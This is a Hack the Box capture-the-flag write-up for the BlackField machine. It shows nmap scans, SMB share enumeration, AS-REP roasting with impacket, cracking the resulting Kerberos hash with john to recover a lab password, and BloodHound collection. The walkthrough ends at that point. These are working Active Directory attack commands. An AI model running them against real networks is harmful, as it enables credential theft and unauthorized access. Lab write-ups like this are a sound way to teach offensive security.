# Hack the Box - BlackField


```CSS
Machine IP: 10.10.10.192
```

```CSS
▶ nmap -Pn -sS -O -p- 10.10.10.192 -T4 --min-rate 1000 -oN ports.nmap

Nmap scan report for 10.10.10.192
Host is up (0.18s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP
5985/tcp open  wsman
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.41 seconds
```

```CSS
▶ nmap -Pn -sC -sV -p 53,88,135,389,445,593,3268,5985 10.10.10.192 -oN services.nmap

Nmap scan report for 10.10.10.192
Host is up (0.18s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-20 13:56:42Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m34s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-05-20T13:57:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.98 seconds
```

---

## SMB Enumeration
  - Anonymous and Guest Enumeration 
```
▶ smbmap -H 10.10.10.192 -u guest
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/ee481776-6d35-4c5a-a235-099ce99ed714)

SMB shares reveal two non-default shares named `forensic` and `profiles$`. The share `forensic` is not accessible however read-only access is allowed on the `profiles$` share. 

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/9a1f88cc-ce6c-4ee0-85b8-97579f3e5553)

---

## Kerberos
  - Kerberos Pre-Authentication Attack (ASREPRoast)
  - Craft a list of users to spray the users
```CSS
▶ smbclient -N \\\\10.10.10.192\\profiles$ -c ls | awk '{ print $1 }' | tee users.txt
```
```CSS
▶ impacket-GetNPUsers blackfield.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.192 | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/99b7e598-7179-457a-84ab-5ff137a3ed46)

---

## Hash Crack (krb5asrep)
```CSS
▶ john krb.hash --format=krb5asrep
```

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/1bd2c405-2c01-48c3-aebe-e3b1b97e88c2)

```CSS
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)
```

---

## BloodHound Python
```CSS
▶ bloodhound-python --username support --password '#00^BlackKnight' --domain blackfield.local --nameserver 10.10.10.192 --collectionmethod all
```

---
